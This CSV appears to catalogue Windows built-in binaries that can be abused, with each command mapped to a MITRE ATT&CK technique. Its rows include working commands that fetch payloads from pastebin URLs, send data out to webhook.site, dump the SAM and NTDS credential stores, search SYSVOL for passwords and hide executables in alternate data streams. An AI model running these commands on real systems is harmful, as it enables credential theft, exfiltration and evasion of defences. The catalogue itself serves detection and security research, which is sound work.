Category,Name,Description,Created,Command,Command Description,Command Category,Command Usecase,Command Privileges,Command OperatingSystem,Command MitreID
OSBinaries,Xwizard.exe,,2018-05-25,xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC},Xwizard.exe running a custom class that has been added to the registry.,Execute,Run a com object created in registry to evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Xwizard.exe,,2018-05-25,xwizard RunWizard /taero /u {00000001-0000-0000-0000-0000FEEDACDC},Xwizard.exe running a custom class that has been added to the registry. The /t and /u switch prevent an error message in later Windows 10 builds.,Execute,Run a com object created in registry to evade defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,Xwizard.exe,,2018-05-25,xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM,Xwizard.exe uses RemoteApp and Desktop Connections wizard to download a file.,Download,Download file from Internet,User,Windows 10,T1105
OSBinaries,Findstr.exe,,2018-05-25,findstr /V /L W3AllLov3LolBas c:\ADS\file.exe > c:\ADS\file.txt:file.exe,"Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.",ADS,Add a file to an alternate data stream to hide from defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Findstr.exe,,2018-05-25,findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe,"Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.",ADS,Add a file to an alternate data stream from a webdav server to hide from defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Findstr.exe,,2018-05-25,findstr /S /I cpassword \\sysvol\policies\*.xml,Search for stored password in Group Policy files stored on SYSVOL.,Credentials,Find credentials stored in cpassword attrbute,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1552.001
OSBinaries,Findstr.exe,,2018-05-25,findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.exe,"Searches for the string W3AllLov3LolBas, since it does not exist (/V) file.exe is downloaded to the target file.",Download,Download/Copy file from webdav server,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1185
OSBinaries,Esentutl.exe,Binary for working with Microsoft Joint Engine Technology (JET) database,2018-05-25,esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o,Copies the source VBS file to the destination VBS file.,Copy,Copies files from A to B,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Esentutl.exe,Binary for working with Microsoft Joint Engine Technology (JET) database,2018-05-25,esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o,Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.,ADS,Copy file and hide it in an alternate data stream as a defensive counter measure,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Esentutl.exe,Binary for working with Microsoft Joint Engine Technology (JET) database,2018-05-25,esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o,Copies the source Alternate Data Stream (ADS) to the destination EXE.,ADS,Extract hidden file within alternate data streams,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Esentutl.exe,Binary for working with Microsoft Joint Engine Technology (JET) database,2018-05-25,esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o,Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.,ADS,Copy file and hide it in an alternate data stream as a defensive counter measure,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Esentutl.exe,Binary for working with Microsoft Joint Engine Technology (JET) database,2018-05-25,esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o,Copies the source EXE to the destination EXE file,Download,Use to copy files from one unc path to another,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Esentutl.exe,Binary for working with Microsoft Joint Engine Technology (JET) database,2018-05-25,esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit,Copies a (locked) file using Volume Shadow Copy,Copy,Copy/extract a locked file such as the AD Database,Admin,"Windows 10, Windows 2016 Server, Windows 2019 Server",T1003.003
OSBinaries,Dllhost.exe,Used by Windows to DLL Surrogate COM Objects,2020-11-07,dllhost.exe /Processid:{CLSID},Use dllhost.exe to load a registered or hijacked COM Server payload.,Execute,Execute a DLL Surrogate COM Object.,User,Windows 10 (and likely previous versions),T1546.015
OSBinaries,Cscript.exe,Binary used to execute scripts in Windows,2018-05-25,cscript c:\ads\file.txt:script.vbs,Use cscript.exe to exectute a Visual Basic script stored in an Alternate Data Stream (ADS).,ADS,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Reg.exe,Used to manipulate the registry,2018-05-25,reg export HKLM\SOFTWARE\Microsoft\Evilreg c:\ads\file.txt:evilreg.reg,Export the target Registry key and save it to the specified .REG file within an Alternate data stream.,ADS,Hide/plant registry information in Alternate data stream for later use,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Reg.exe,Used to manipulate the registry,2018-05-25,reg save HKLM\SECURITY c:\test\security.bak && reg save HKLM\SYSTEM c:\test\system.bak && reg save HKLM\SAM c:\test\sam.bak,"Dump registry hives (SAM, SYSTEM, SECURITY) to retrieve password hashes and key material",Credentials,Dump credentials from the Security Account Manager (SAM),Administrator,"Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1003.002
OSBinaries,IMEWDBLD.exe,Microsoft IME Open Extended Dictionary Module,2020-03-05,C:\Windows\System32\IME\SHARED\IMEWDBLD.exe https://pastebin.com/raw/tdyShwLw,"IMEWDBLD.exe attempts to load a dictionary file, if provided a URL as an argument, it will download the file served at by that URL and save it to %LocalAppData%\Microsoft\Windows\INetCache\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION> or %LocalAppData%\Microsoft\Windows\INetCache\IE\<8_RANDOM_ALNUM_CHARS>/<FILENAME>[1].<EXTENSION>",Download,Download file from Internet,User,Windows 10,T1105
OSBinaries,Csc.exe,Binary file used by .NET to compile C# code,2018-05-25,csc.exe -out:My.exe File.cs,Use CSC.EXE to compile C# code stored in File.cs and output the compiled version to My.exe.,Compile,Compile attacker code on system. Bypass defensive counter measures.,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1127
OSBinaries,Csc.exe,Binary file used by .NET to compile C# code,2018-05-25,csc -target:library File.cs,Use CSC.EXE to compile C# code stored in File.cs and output the compiled version to a dll file.,Compile,Compile attacker code on system. Bypass defensive counter measures.,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1127
OSBinaries,Pnputil.exe,Used for installing drivers,2020-12-25,pnputil.exe -i -a C:\Users\hai\Desktop\mo.inf,Used for installing drivers,Execute,Add malicious driver,Administrator,"Windows 10,7",T1547
OSBinaries,Atbroker.exe,Helper binary for Assistive Technology (AT),2018-05-25,ATBroker.exe /start malware,Start a registered Assistive Technology (AT).,Execute,Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistibe Technology (AT) service entry.,User,"Windows 8, Windows 8.1, Windows 10",T1218
OSBinaries,DataSvcUtil.exe,DataSvcUtil.exe is a command-line tool provided by WCF Data Services that consumes an Open Data Protocol (OData) feed and generates the client data service classes that are needed to access a data service from a .NET Framework client application.,01/12/2020,DataSvcUtil /out:C:\\Windows\\System32\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile,"Upload file, credentials or data exfiltration in general",Upload,Upload file,User,Windows 10,T1567
OSBinaries,AppInstaller.exe,Tool used for installation of AppX/MSIX applications on Windows 10,2020-12-02,start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw,"AppInstaller.exe is spawned by the default handler for the URI, it attempts to load/install a package from the URL and is saved in C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\<RANDOM-8-CHAR-DIRECTORY>",Download,Download file from Internet,User,Windows 10,T1105
OSBinaries,Print.exe,Used by Windows to send files to the printer,2018-05-25,print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe,Copy file.exe into the Alternate Data Stream (ADS) of file.txt.,ADS,Hide binary file in alternate data stream to potentially bypass defensive counter measures,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1564.004
OSBinaries,Print.exe,Used by Windows to send files to the printer,2018-05-25,print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe,Copy FileToCopy.exe to the target C:\ADS\CopyOfFile.exe,Copy,Copy files,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Print.exe,Used by Windows to send files to the printer,2018-05-25,print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe,Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.,Copy,Copy/Download file from remote server,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1105
OSBinaries,Pcwrun.exe,Program Compatibility Wizard,2018-05-25,Pcwrun.exe c:\temp\beacon.exe,Open the target .EXE file with the Program Compatibility Wizard.,Execute,Proxy execution of binary,User,"Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10",T1218
